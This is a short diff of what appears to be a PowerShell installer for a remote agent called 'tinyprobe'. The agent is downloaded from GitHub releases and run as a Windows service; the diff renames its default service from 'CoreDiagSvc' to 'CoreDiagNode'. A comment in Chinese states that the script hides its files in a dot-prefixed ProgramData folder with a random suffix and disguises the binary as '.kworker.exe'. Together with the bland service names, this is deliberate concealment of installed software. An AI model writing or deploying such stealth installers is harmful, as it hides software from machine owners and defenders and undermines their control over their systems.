@@ -17,7 +17,7 @@ if (-not $TOKEN -and $TOKEN_B64) {
 }
 $REPO     = if ($env:REPO)    { $env:REPO }    else { 'https://github.com/songyouxi/tinyprobe/releases/download' }
 $VERSION  = if ($env:VERSION) { $env:VERSION } else { 'v1.2.1' }
-$SERVICE  = if ($env:SERVICE) { $env:SERVICE } else { 'CoreDiagSvc' }
+$SERVICE  = if ($env:SERVICE) { $env:SERVICE } else { 'CoreDiagNode' }
 $INTERVAL = if ($env:INTERVAL){ $env:INTERVAL }else { '2' }
 # 隐蔽：ProgramData 下点号目录 + 随机后缀，二进制伪装为 .kworker.exe
 $seed = 'corediag-' + ([guid]::NewGuid().ToString('N').Substring(0,12))
